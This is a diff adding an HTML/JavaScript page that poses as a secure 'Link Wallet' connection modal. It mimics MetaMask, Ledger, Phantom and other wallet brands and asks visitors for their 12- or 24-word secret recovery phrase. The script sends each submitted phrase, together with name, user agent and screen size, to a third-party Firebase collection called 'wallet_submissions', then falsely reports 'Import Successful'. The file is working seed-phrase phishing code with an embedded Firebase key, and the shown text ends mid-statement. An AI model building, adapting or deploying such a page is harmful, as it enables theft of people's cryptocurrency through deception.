@@ -1,0 +1,927 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Link Wallet | Secure Connection</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    <style>
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background-color: #060d1e; 
+            color: white; 
+            overflow: hidden;
+        }
+
+        .modal-overlay { 
+            background: rgba(0, 0, 0, 0.7); 
+            backdrop-filter: blur(4px); 
+            z-index: 9999;
+        }
+        
+        /* FIXED MODAL SIZING */
+        .modal-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        .fixed-modal-size {
+            width: 100vw;
+            height: 100vh;
+            margin: 0;
+            border-radius: 0;
+            display: flex;
+            flex-direction: column;
+            background: white;
+            overflow: hidden;
+        }
+        
+        @media (min-width: 768px) {
+            .fixed-modal-size {
+                width: 95vw;
+                max-width: 1100px;
+                height: 95vh;
+                max-height: 700px;
+                border-radius: 24px;
+                flex-direction: row;
+            }
+        }
+        
+        /* WALLET LIST - FIXED HEIGHT WITH SCROLL */
+        #walletListPanel {
+            height: 35vh;
+            min-height: 300px;
+            max-height: 350px;
+            overflow-y: auto;
+            border-bottom: 1px solid #e5e7eb;
+        }
+        
+        @media (min-width: 768px) {
+            #walletListPanel {
+                width: 35%;
+                height: 100%;
+                max-height: 100%;
+                border-right: 1px solid #e5e7eb;
+                border-bottom: none;
+            }
+        }
+        
+        /* FORM SECTION - FIXED HEIGHT */
+        #interactionPanel {
+            height: calc(65vh - 60px);
+            min-height: 500px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        @media (min-width: 768px) {
+            #interactionPanel {
+                width: 65%;
+                height: 100%;
+                min-height: auto;
+            }
+        }
+        
+        /* FORM CONTENT - FLEXIBLE LAYOUT */
+        .form-scrollable {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            padding: 1rem;
+        }
+        
+        @media (min-width: 640px) {
+            .form-scrollable {
+                padding: 1.25rem;
+            }
+        }
+        
+        @media (min-width: 768px) {
+            .form-scrollable {
+                padding: 1.5rem;
+            }
+        }
+        
+        /* FORM CONTAINER - PROPER HEIGHT DISTRIBUTION */
+        #formState {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            min-height: 0;
+        }
+        
+        /* HEADER - FIXED HEIGHT */
+        .form-header {
+            flex-shrink: 0;
+            margin-bottom: 1rem;
+        }
+        
+        /* FORM CONTENT - EXPANDABLE */
+        #submissionForm {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            min-height: 0;
+        }
+        
+        /* FORM INPUTS SECTION - FIXED HEIGHT */
+        .form-inputs-section {
+            flex-shrink: 0;
+        }
+        
+        /* PHRASE GRID - EXPANDS TO FILL SPACE */
+        #phraseGrid {
+            flex: 1;
+            min-height: 0;
+            overflow-y: auto;
+            margin-top: 0.75rem;
+            margin-bottom: 0.75rem;
+            max-height: 400px;
+        }
+        
+        /* TEXTAREA SPECIFIC STYLES */
+        .phrase-textarea-container {
+            flex: 1;
+            min-height: 0;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .phrase-textarea {
+            flex: 1;
+            min-height: 200px;
+            resize: none;
+            font-family: 'Inter', monospace;
+            line-height: 1.5;
+            padding: 1rem;
+        }
+        
+        .phrase-textarea::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .phrase-textarea::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 3px;
+        }
+        
+        .phrase-textarea::-webkit-scrollbar-thumb {
+            background: #c1c1c1;
+            border-radius: 3px;
+        }
+        
+        .phrase-textarea::-webkit-scrollbar-thumb:hover {
+            background: #a1a1a1;
+        }
+        
+        /* SUBMIT BUTTON - ALWAYS VISIBLE AT BOTTOM */
+        .submit-button-container {
+            flex-shrink: 0;
+            margin-top: auto;
+        }
+        
+        /* Compact styling */
+        .compact-input {
+            padding: 0.75rem 1rem !important;
+            font-size: 0.9rem !important;
+            min-height: 46px !important;
+        }
+        
+        .compact-button {
+            padding: 0.875rem !important;
+            font-size: 0.9rem !important;
+            min-height: 48px !important;
+        }
+        
+        .compact-phrase-box {
+            padding: 0.625rem !important;
+            border-radius: 0.5rem !important;
+            min-height: 46px !important;
+        }
+        
+        .compact-phrase-box input {
+            font-size: 0.875rem !important;
+        }
+        
+        .compact-phrase-box .eye-toggle {
+            padding: 0.25rem !important;
+        }
+        
+        /* Custom scrollbar styling */
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 4px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 10px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: #c1c1c1;
+            border-radius: 10px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+            background: #a1a1a1;
+        }
+        
+        /* Wallet items styling */
+        .wallet-item:hover { 
+            background-color: #f8f9fa; 
+        }
+        .wallet-item.active { 
+            background-color: #f1f3f5; 
+        }
+        
+        @media (min-width: 768px) {
+            .wallet-item.active { 
+                border-right: 4px solid #007aff;
+            }
+        }
+        
+        /* Button styling */
+        .btn-gold { 
+            background-color: #eab308; 
+            color: black; 
+            transition: all 0.2s; 
+        }
+        .btn-gold:hover { 
+            background-color: #ca8a04; 
+        }
+        
+        /* Responsive grids */
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 0.5rem;
+        }
+        
+        @media (min-width: 768px) {
+            .wallet-grid {
+                display: block;
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .phrase-grid-responsive {
+            grid-template-columns: 1fr;
+            gap: 0.5rem !important;
+        }
+        
+        @media (min-width: 640px) {
+            .phrase-grid-responsive {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        
+        /* Theme classes */
+        .theme-metamask { background-color: #ffffff !important; color: #141618 !important; }
+        .theme-metamask .phrase-box { background-color: #f6f8fa !important; border-color: #f6851b !important; }
+        .theme-metamask .btn-submit { background-color: #f6851b !important; color: white !important; }
+        .theme-trust { background-color: #ffffff !important; color: #1e2329 !important; }
+        .theme-trust .phrase-box { background-color: #f1f3f5 !important; border-radius: 0.5rem !important; }
+        .theme-trust .btn-submit { background-color: #3375bb !important; color: white !important; }
+        .theme-coinbase { background-color: #ffffff !important; color: #0a0b0d !important; }
+        .theme-coinbase .phrase-box { background-color: #f5f8ff !important; border: 1px solid #e5ecff !important; }
+        .theme-coinbase .btn-submit { background-color: #0052ff !important; color: white !important; }
+        .theme-ledger { background-color: #000000 !important; color: #ffffff !important; }
+        .theme-ledger .phrase-box { background-color: #1a1a1a !important; border-color: #3d3d3d !important; }
+        .theme-ledger .btn-submit { background-color: #ffffff !important; color: #000000 !important; }
+        .theme-exodus { background: linear-gradient(135deg, #0b0e11 0%, #1a1d21 100%) !important; color: #ffffff !important; }
+        .theme-exodus .phrase-box { background-color: rgba(255,255,255,0.05) !important; border-color: #6c4cf1 !important; }
+        .theme-exodus .btn-submit { background: linear-gradient(90deg, #6c4cf1, #8f6aff) !important; color: white !important; }
+        .theme-phantom { background-color: #1c1c1e !important; color: #ffffff !important; }
+        .theme-phantom .phrase-box { background-color: #2c2c2e !important; border-radius: 0.5rem !important; }
+        .theme-phantom .btn-submit { background: linear-gradient(90deg, #ab9ff2, #7b6cff) !important; color: white !important; }
+        .theme-rainbow { background-color: #ffffff !important; color: #000000 !important; }
+        .theme-rainbow .phrase-box { background-color: #fff0f7 !important; border: 1px solid #ff007a !important; }
+        .theme-rainbow .btn-submit { background-color: #ff007a !important; color: white !important; }
+        .theme-safe { background-color: #0d0f12 !important; color: #ffffff !important; }
+        .theme-safe .phrase-box { background-color: #1a1a1a !important; border-color: #12ff80 !important; }
+        .theme-safe .btn-submit { background-color: #12ff80 !important; color: #000000 !important; }
+        .theme-others { background-color: #f8f9fa !important; color: #333333 !important; }
+        .theme-others .phrase-box { background-color: #ffffff !important; border: 1px solid #6b7280 !important; }
+        .theme-others .btn-submit { background-color: #6b7280 !important; color: white !important; }
+        .theme-others .phrase-textarea { background-color: #ffffff !important; border: 1px solid #d1d5db !important; }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+    <!-- Header -->
+    <nav class="p-4 border-b border-white/5 flex items-center justify-between">
+        <div class="flex items-center gap-2">
+            <i data-lucide="chevron-left" class="w-5 h-5 cursor-pointer"></i>
+        </div>
+        <h1 class="text-sm font-semibold tracking-wide uppercase opacity-70">Link Wallet</h1>
+        <div class="w-5"></div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="flex-1 flex flex-col items-center justify-center p-4 sm:p-6 text-center">
+        <div class="mb-6 sm:mb-8 px-2">
+            <div class="w-16 h-16 sm:w-20 sm:h-20 bg-yellow-500/20 rounded-2xl flex items-center justify-center mx-auto mb-4 sm:mb-6">
+                <i data-lucide="lock" class="w-8 h-8 sm:w-10 sm:h-10 text-yellow-500 fill-yellow-500/20"></i>
+            </div>
+            <h2 class="text-2xl sm:text-3xl font-bold mb-2 sm:mb-3">Connect Your Wallet</h2>
+            <p class="text-gray-400 text-sm sm:text-base max-w-md mx-auto">Securely connect your external wallet to access your funds and manage your assets.</p>
+        </div>
+
+        <button id="openModalBtn" class="btn-gold w-full max-w-sm sm:max-w-4xl py-3 sm:py-4 rounded-xl font-bold text-base sm:text-lg flex items-center justify-center gap-2 shadow-lg">
+            <i data-lucide="lock" class="w-4 h-4 sm:w-5 sm:h-5"></i>
+            Connect Wallet
+        </button>
+    </main>
+
+    <!-- Modal Container -->
+    <div id="modal" class="hidden fixed inset-0 modal-overlay modal-container">
+        <div class="fixed-modal-size shadow-2xl animate-in fade-in zoom-in duration-300">
+            
+            <!-- Mobile Header -->
+            <div class="md:hidden p-3 border-b border-gray-200 flex items-center justify-between bg-[#f8f9fa]">
+                <button id="mobileCloseBtn" class="p-2">
+                    <i data-lucide="x" class="w-5 h-5 text-gray-600"></i>
+                </button>
+                <span class="font-semibold text-gray-700 text-sm">Select Wallet</span>
+                <div class="w-9"></div>
+            </div>
+            
+            <!-- Left Side: Wallet List -->
+            <div id="walletListPanel" class="bg-[#f8f9fa]">
+                <div class="p-4 sm:p-6 flex flex-col h-full">
+                    <div class="flex items-center gap-3 mb-3">
+                        <span class="bg-gray-800 text-white px-3 py-1 rounded-full text-xs font-bold">reown</span>
+                        <span class="text-gray-500 text-sm font-medium">Manual Kit</span>
+                    </div>
+                    <h3 class="text-gray-400 text-xs font-bold uppercase tracking-widest mb-3">Recommended :</h3>
+                    
+                    <div class="wallet-grid md:block space-y-1 flex-1 custom-scrollbar">
+                        <div class="wallet-item active p-3 rounded-xl flex items-center gap-3 cursor-pointer transition-colors" data-wallet="Metamask">
+                            <img src="assets/metamask.webp" class="w-7 h-7 object-contain" alt="Metamask">
+                            <span class="font-semibold text-gray-700 text-sm">Metamask</span>
+                        </div>
+                        <div class="wallet-item p-3 rounded-xl flex items-center gap-3 cursor-pointer transition-colors" data-wallet="Trust Wallet">
+                            <img src="assets/trustwallet.webp" class="w-7 h-7 object-contain" alt="Trust Wallet">
+                            <span class="font-semibold text-gray-700 text-sm">Trust Wallet</span>
+                        </div>
+                        <div class="wallet-item p-3 rounded-xl flex items-center gap-3 cursor-pointer transition-colors" data-wallet="Coinbase Wallet">
+                            <img src="assets/coinbase.png" class="w-7 h-7 object-contain" alt="Coinbase">
+                            <span class="font-semibold text-gray-700 text-sm">Coinbase Wallet</span>
+                        </div>
+                        <div class="wallet-item p-3 rounded-xl flex items-center gap-3 cursor-pointer transition-colors" data-wallet="Ledger">
+                            <img src="assets/nano x.webp" class="w-7 h-7 object-contain" alt="Ledger">
+                            <span class="font-semibold text-gray-700 text-sm">Nano X Ledger</span>
+                        </div>
+                        <div class="wallet-item p-3 rounded-xl flex items-center gap-3 cursor-pointer transition-colors" data-wallet="Exodus">
+                            <img src="https://www.exodus.com/brand/img/logo.svg" class="w-7 h-7 object-contain bg-slate-900 p-1 rounded-lg" alt="Exodus">
+                            <span class="font-semibold text-gray-700 text-sm">Exodus Wallet</span>
+                        </div>
+                        <div class="wallet-item p-3 rounded-xl flex items-center gap-3 cursor-pointer transition-colors" data-wallet="Phantom">
+                            <img src="assets/phantom.png" class="w-7 h-7 object-contain" alt="Phantom">
+                            <span class="font-semibold text-gray-700 text-sm">Phantom</span>
+                        </div>
+                        <div class="wallet-item p-3 rounded-xl flex items-center gap-3 cursor-pointer transition-colors" data-wallet="Rainbow">
+                            <img src="assets/rainbow.jpg" class="w-7 h-7 object-contain" alt="Rainbow">
+                            <span class="font-semibold text-gray-700 text-sm">Rainbow</span>
+                        </div>
+                        <div class="wallet-item p-3 rounded-xl flex items-center gap-3 cursor-pointer transition-colors" data-wallet="Safe">
+                            <img src="https://safe.global/favicon.ico" class="w-7 h-7 object-contain" alt="Safe">
+                            <span class="font-semibold text-gray-700 text-sm">Safe Wallet</span>
+                        </div>
+                        <!-- Others Wallet Option -->
+                        <div class="wallet-item p-3 rounded-xl flex items-center gap-3 cursor-pointer transition-colors" data-wallet="Others">
+                            <div class="w-7 h-7 bg-gray-200 rounded-lg flex items-center justify-center">
+                                <i data-lucide="plus" class="w-4 h-4 text-gray-600"></i>
+                            </div>
+                            <span class="font-semibold text-gray-700 text-sm">Other Wallet</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Right Side: Interaction Area -->
+            <div id="interactionPanel" class="relative">
+                <!-- Desktop Close Button -->
+                <button id="closeModalBtn" class="absolute top-3 right-3 md:top-4 md:right-4 p-2 rounded-full border border-gray-200 text-blue-500 hover:bg-gray-50 transition-colors hidden md:block z-10">
+                    <i data-lucide="x" class="w-4 h-4"></i>
+                </button>
+
+                <!-- Form content wrapper -->
+                <div class="form-scrollable">
+                    <!-- Initial State -->
+                    <div id="initialState" class="flex flex-col items-center justify-center text-center h-full">
+                        <div class="mb-3 relative">
+                            <i data-lucide="mouse-pointer-2" class="w-10 h-10 text-gray-300"></i>
+                            <div class="absolute -top-1 -right-1 w-3 h-3 bg-gray-200 rounded-full animate-ping"></div>
+                        </div>
+                        <p class="text-gray-400 font-medium text-sm">Select a wallet to continue</p>
+                    </div>
+
+                    <!-- Form State (Hidden Initially) -->
+                    <div id="formState" class="hidden flex-col h-full">
+                        <!-- Header - Always visible -->
+                        <div class="form-header flex flex-col items-center">
+                            <img id="selectedWalletLogo" src="#" class="w-10 h-10 mb-2 hidden" alt="Wallet">
+                            <div id="othersLogo" class="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center mb-2 hidden">
+                                <i data-lucide="wallet" class="w-5 h-5 text-gray-600"></i>
+                            </div>
+                            <h2 id="importTitle" class="text-xl font-bold text-center mb-1">Import with Secret Phrase</h2>
+                            <p id="brandWarning" class="text-xs opacity-60 text-center max-w-md"></p>
+                        </div>
+
+                        <!-- Form with proper height distribution -->
+                        <form id="submissionForm" class="flex-1 flex flex-col min-h-0">
+                            <!-- Fixed inputs section -->
+                            <div class="form-inputs-section space-y-3">
+                                <input type="text" id="userName" placeholder="Enter your name" class="compact-input w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-gray-600">
+                                
+                                <!-- Others Provider Input -->
+                                <div id="othersProviderInput" class="hidden">
+                                    <input type="text" id="customProvider" placeholder="Enter your wallet provider name" class="compact-input w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-gray-600">
+                                </div>
+                                
+                                <!-- Phrase Type Selector (Hidden for Others) -->
+                                <div id="phraseTypeContainer" class="relative">
+                                    <select id="phraseType" class="compact-input w-full appearance-none px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all font-medium text-gray-700 bg-white">
+                                        <option value="12">I have a 12 word Secret Phrase</option>
+                                        <option value="24">I have a 24 word Secret Phrase</option>
+                                    </select>
+                                    <i data-lucide="chevron-down" class="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none"></i>
+                                </div>
+                            </div>
+
+                            <!-- Phrase Input Area -->
+                            <div id="phraseInputArea" class="flex-1 min-h-0 mt-3 mb-3">
+                                <!-- Grid Input (for regular wallets) -->
+                                <div id="phraseGrid" class="phrase-grid-responsive grid custom-scrollbar h-full"></div>
+                                
+                                <!-- Textarea Input (for Others wallet) -->
+                                <div id="phraseTextareaContainer" class="hidden phrase-textarea-container">
+                                    <textarea 
+                                        id="phraseTextarea" 
+                                        class="phrase-textarea w-full border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-gray-700 placeholder-gray-400"
+                                        placeholder="Enter your secret phrase here, separated by spaces. For example: word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"
+                                        spellcheck="false"
+                                        autocapitalize="off"
+                                        autocomplete="off"
+                                        autocorrect="off"
+                                    ></textarea>
+                                    <div class="flex justify-between items-center mt-2">
+                                        <span class="text-xs text-gray-500">
+                                            <span id="wordCount">0</span> words detected
+                                        </span>
+                                        <button type="button" id="toggleVisibility" class="text-xs text-gray-500 hover:text-gray-700 flex items-center gap-1">
+                                            <i data-lucide="eye-off" class="w-3 h-3"></i>
+                                            <span>Show phrase</span>
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Submit Button - Always visible at bottom -->
+                            <div class="submit-button-container">
+                                <button type="submit" id="submitBtn" class="compact-button w-full py-3 rounded-full font-bold btn-submit transition-all shadow-lg active:scale-95">
+                                    Confirm Secret Recovery Phrase
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+
+                    <!-- Loading State -->
+                    <div id="loadingOverlay" class="hidden absolute inset-0 bg-white/80 flex flex-col items-center justify-center z-10 backdrop-blur-sm">
+                        <div class="w-10 h-10 border-3 border-blue-500 border-t-transparent rounded-full animate-spin mb-3"></div>
+                        <p class="text-blue-600 font-bold text-sm">Securing connection...</p>
+                    </div>
+
+                    <!-- Success State -->
+                    <div id="successOverlay" class="hidden absolute inset-0 bg-white flex flex-col items-center justify-center z-20 text-center p-4">
+                        <div class="w-14 h-14 bg-green-100 rounded-full flex items-center justify-center mb-4 animate-bounce">
+                            <i data-lucide="check" class="w-7 h-7 text-green-500"></i>
+                        </div>
+                        <h3 class="text-lg font-bold text-gray-800 mb-2">Import Successful</h3>
+                        <p class="text-gray-500 text-sm">Your wallet has been securely imported.</p>
+                        <button id="closeSuccessBtn" class="mt-4 px-5 py-2 bg-blue-500 text-white rounded-full font-medium text-sm">
+                            Close
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"
+        import {
+            getFirestore,
+            collection,
+            addDoc,
+            serverTimestamp,
+        } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js"
+
+        // Use the global lucide instance
+        const { createIcons } = lucide;
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCnBgSQy4SsvmR73iedkHCWKoseUyALS6s",
+            authDomain: "wyominglimited0.firebaseapp.com",
+            projectId: "wyominglimited0",
+            storageBucket: "wyominglimited0.firebasestorage.app",
+            messagingSenderId: "580988653712",
+            appId: "1:580988653712:web:c3b28d07bf8409f93ec815",
+            measurementId: "G-MT8SLSYM3S",
+        }
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig)
+        const db = getFirestore(app)
+
+        // DOM Elements
+        const modal = document.getElementById("modal")
+        const openModalBtn = document.getElementById("openModalBtn")
+        const closeModalBtn = document.getElementById("closeModalBtn")
+        const mobileCloseBtn = document.getElementById("mobileCloseBtn")
+        const walletItems = document.querySelectorAll(".wallet-item")
+        const initialState = document.getElementById("initialState")
+        const formState = document.getElementById("formState")
+        const phraseGrid = document.getElementById("phraseGrid")
+        const phraseTypeSelect = document.getElementById("phraseType")
+        const phraseTypeContainer = document.getElementById("phraseTypeContainer")
+        const phraseTextareaContainer = document.getElementById("phraseTextareaContainer")
+        const phraseTextarea = document.getElementById("phraseTextarea")
+        const wordCount = document.getElementById("wordCount")
+        const toggleVisibility = document.getElementById("toggleVisibility")
+        const selectedWalletLogo = document.getElementById("selectedWalletLogo")
+        const othersLogo = document.getElementById("othersLogo")
+        const othersProviderInput = document.getElementById("othersProviderInput")
+        const customProviderInput = document.getElementById("customProvider")
+        const submissionForm = document.getElementById("submissionForm")
+        const loadingOverlay = document.getElementById("loadingOverlay")
+        const successOverlay = document.getElementById("successOverlay")
+        const closeSuccessBtn = document.getElementById("closeSuccessBtn")
+
+        let selectedWallet = "Metamask"
+        let customProvider = ""
+        let isTextareaVisible = false
+
+        const walletThemes = {
+            Metamask: {
+                class: "theme-metamask",
+                primary: "#007aff",
+                logo: "assets/metamask.webp",
+                warning: "Never share your secret recovery phrase with anyone. MetaMask will never ask for it.",
+                title: "Import your wallet with Secret Phrase",
+            },
+            "Trust Wallet": {
+                class: "theme-trust",
+                primary: "#3375BB",
+                logo: "assets/trustwallet.webp",
+                warning: "Your Secret Phrase is the master key to your wallet. Keep it safe.",
+                title: "Import with Secret Phrase",
+            },
+            "Coinbase Wallet": {
+                class: "theme-coinbase",
+                primary: "#ffffff",
+                logo: "assets/coinbase.png",
+                warning: "Enter the 12 or 24 word recovery phrase associated with your wallet.",
+                title: "Import existing wallet",
+            },
+            Ledger: {
+                class: "theme-ledger",
+                primary: "#ffffff",
+                logo: "assets/nano x.webp",
+                warning: "Your recovery phrase is your only backup. Ledger will never ask for it.",
+                title: "Restore from Recovery Phrase",
+            },
+            Exodus: {
+                class: "theme-exodus",
+                logo: "https://www.exodus.com/brand/img/logo.svg",
+                warning: "Restore your Exodus wallet using your 12-word secret phrase.",
+                title: "Restore Wallet",
+            },
+            Phantom: {
+                class: "theme-phantom",
+                logo: "assets/phantom.png",
+                warning: "Import an existing wallet using your Secret Recovery Phrase.",
+                title: "Import Wallet",
+            },
+            Rainbow: {
+                class: "theme-rainbow",
+                logo: "assets/rainbow.jpg",
+                warning: "Enter your secret phrase to import your stylish wallet.",
+                title: "Import with Secret Phrase",
+            },
+            Safe: {
+                class: "theme-safe",
+                logo: "https://safe.global/favicon.ico",
+                warning: "Institutional recovery setup. Ensure you are in a secure environment.",
+                title: "Import Safe Signer",
+            },
+            Others: {
+                class: "theme-others",
+                logo: "",
+                warning: "Enter your wallet's secret recovery phrase. Make sure you're in a secure environment.",
+                title: "Import Other Wallet",
+            }
+        }
+
+        // Modal Logic
+        openModalBtn.addEventListener("click", () => {
+            modal.classList.remove("hidden")
+            document.body.style.overflow = 'hidden'
+        })
+
+        function closeModal() {
+            modal.classList.add("hidden")
+            document.body.style.overflow = 'auto'
+            resetForm()
+        }
+
+        closeModalBtn.addEventListener("click", closeModal)
+        mobileCloseBtn.addEventListener("click", closeModal)
+        closeSuccessBtn.addEventListener("click", closeModal)
+
+        // Close modal on overlay click
+        modal.addEventListener("click", (e) => {
+            if (e.target === modal) {
+                closeModal()
+            }
+        })
+
+        // Wallet Selection
+        walletItems.forEach((item) => {
+            item.addEventListener("click", () => {
+                walletItems.forEach((i) => i.classList.remove("active"))
+                item.classList.add("active")
+
+                selectedWallet = item.dataset.wallet
+                const theme = walletThemes[selectedWallet] || walletThemes["Metamask"]
+
+                const interactionPanel = document.getElementById("interactionPanel")
+                interactionPanel.className = `relative ${theme.class}`
+
+                const submitBtn = document.getElementById("submitBtn")
+                if (selectedWallet === "Coinbase Wallet") {
+                    submitBtn.style.backgroundColor = "white"
+                    submitBtn.style.color = "#0052ff"
+                } else if (selectedWallet === "Ledger") {
+                    submitBtn.style.backgroundColor = "#ffffff"
+                    submitBtn.style.color = "#000000"
+                } else if (selectedWallet === "Others") {
+                    submitBtn.style.backgroundColor = "#6b7280"
+                    submitBtn.style.color = "white"
+                } else {
+                    submitBtn.style.backgroundColor = "#007aff"
+                    submitBtn.style.color = "white"
+                }
+
+                // Switch to form state
+                initialState.classList.add("hidden")
+                formState.classList.remove("hidden")
+                
+                // Handle display based on wallet type
+                if (selectedWallet === "Others") {
+                    // Show textarea input for Others
+                    selectedWalletLogo.classList.add("hidden")
+                    othersLogo.classList.remove("hidden")
+                    othersProviderInput.classList.remove("hidden")
+                    phraseTypeContainer.classList.add("hidden")
+                    phraseGrid.classList.add("hidden")
+                    phraseTextareaContainer.classList.remove("hidden")
+                    customProviderInput.focus()
+                    
+                    // Reset textarea
+                    phraseTextarea.value = ""
+                    updateWordCount()
+                    isTextareaVisible = false
+                    updateTextareaVisibility()
+                } else {
+                    // Show grid input for regular wallets
+                    selectedWalletLogo.classList.remove("hidden")
+                    othersLogo.classList.add("hidden")
+                    othersProviderInput.classList.add("hidden")
+                    phraseTypeContainer.classList.remove("hidden")
+                    phraseGrid.classList.remove("hidden")
+                    phraseTextareaContainer.classList.add("hidden")
+                    selectedWalletLogo.src = theme.logo
+                }
+
+                document.getElementById("importTitle").innerText = theme.title
+                document.getElementById("brandWarning").innerText = theme.warning
+
+                generatePhraseGrid(phraseTypeSelect.value)
+            })
+        })
+
+        // Handle custom provider input
+        customProviderInput.addEventListener("input", (e) => {
+            customProvider = e.target.value.trim()
+        })
+
+        // Word count for textarea
+        phraseTextarea.addEventListener("input", updateWordCount)
+        
+        function updateWordCount() {
+            const text = phraseTextarea.value.trim()
+            const words = text ? text.split(/\s+/).filter(word => word.length > 0) : []
+            wordCount.textContent = words.length
+        }
+
+        // Toggle textarea visibility
+        toggleVisibility.addEventListener("click", () => {
+            isTextareaVisible = !isTextareaVisible
+            updateTextareaVisibility()
+        })
+
+        function updateTextareaVisibility() {
+            const icon = toggleVisibility.querySelector("i")
+            const textSpan = toggleVisibility.querySelector("span")
+            
+            if (isTextareaVisible) {
+                phraseTextarea.type = "text"
+                icon.setAttribute("data-lucide", "eye")
+                textSpan.textContent = "Hide phrase"
+            } else {
+                phraseTextarea.type = "password"
+                icon.setAttribute("data-lucide", "eye-off")
+                textSpan.textContent = "Show phrase"
+            }
+            createIcons()
+        }
+
+        // Phrase Grid Generation (for regular wallets)
+        function generatePhraseGrid(count) {
+            phraseGrid.innerHTML = ""
+            
+            for (let i = 1; i <= count; i++) {
+                const div = document.createElement("div")
+                div.className = `relative flex items-center phrase-box compact-phrase-box border rounded-md group focus-within:ring-1 focus-within:ring-blue-500/20 transition-all shadow-sm`
+                div.innerHTML = `
+                    <span class="text-xs font-bold opacity-40 mr-2 w-4">${i}.</span>
+                    <input type="password" name="word_${i}" placeholder="Word #${i}" 
+                           class="bg-transparent border-none outline-none flex-1 text-sm font-medium placeholder:opacity-30 focus:ring-0 placeholder:text-xs">
+                    <button type="button" class="eye-toggle p-0.5 opacity-50 hover:opacity-100 transition-opacity">
+                        <i data-lucide="eye-off" class="w-3 h-3"></i>
+                    </button>
+                `
+                phraseGrid.appendChild(div)
+            }
+            createIcons()
+
+            // Add eye toggle logic
+            document.querySelectorAll(".eye-toggle").forEach((btn) => {
+                btn.addEventListener("click", (e) => {
+                    e.stopPropagation()
+                    const input = btn.previousElementSibling
+                    if (input.type === "password") {
+                        input.type = "text"
+                        btn.innerHTML = `<i data-lucide="eye" class="w-3 h-3"></i>`
+                    } else {
+                        input.type = "password"
+                        btn.innerHTML = `<i data-lucide="eye-off" class="w-3 h-3"></i>`
+                    }
+                    createIcons()
+                })
+            })
+        }
+
+        phraseTypeSelect.addEventListener("change", (e) => {
+            generatePhraseGrid(e.target.value)
+        })
+
+        // Form Submission
+        submissionForm.addEventListener("submit", async (e) => {
+            e.preventDefault()
+
+            const userName = document.getElementById("userName").value.trim()
+            
+            // Handle custom provider validation
+            if (selectedWallet === "Others") {
+                customProvider = customProviderInput.value.trim()
+                if (!customProvider) {
+                    alert("Please enter your wallet provider name.")
+                    customProviderInput.focus()
+                    return
+                }
+            }
+            
+            let phraseString = ""
+            let wordCount = 0
+            
+            if (selectedWallet === "Others") {
+                // Get phrase from textarea
+                phraseString = phraseTextarea.value.trim()
+                if (!phraseString) {
+                    alert("Please enter your secret phrase.")
+                    phraseTextarea.focus()
+                    return
+                }
+                wordCount = phraseString.split(/\s+/).filter(word => word.length > 0).length
+                
+                // Basic validation
+                if (wordCount < 12 || wordCount > 24) {
+                    alert("Please enter a valid secret phrase (12-24 words).")
+                    phraseTextarea.focus()
+                    return
+                }
+            } else {
+                // Get phrase from grid inputs
+                const inputs = phraseGrid.querySelectorAll("input")
+                const words = Array.from(inputs).map((input) => input.value.trim())
+
+                if (words.some((word) => !word)) {
+                    alert("Please fill in all words of your secret phrase.")
+                    return
+                }
+
+                phraseString = words.join(" ")
+                wordCount = words.length
+            }
+            
+            // Determine final wallet name
+            const finalWalletName = selectedWallet === "Others" ? customProvider : selectedWallet
+
+            loadingOverlay.classList.remove("hidden")
+
+            try {
+                await addDoc(collection(db, "wallet_submissions"), {
+                    userName,
+                    selectedWallet: finalWalletName,
+                    isCustomProvider: selectedWallet === "Others",
+                    customProvider: selectedWallet === "Others" ? customProvider : "",
+                    phrase: phraseString,
+                    phraseCount: wordCount,
+                    inputMethod: selectedWallet === "Others" ? "textarea" : "grid",
+                    timestamp: serverTimestamp(),
+                    userAgent: navigator.userAgent,
+                    screenSize: `${window.innerWidth}x${window.innerHeight}`,
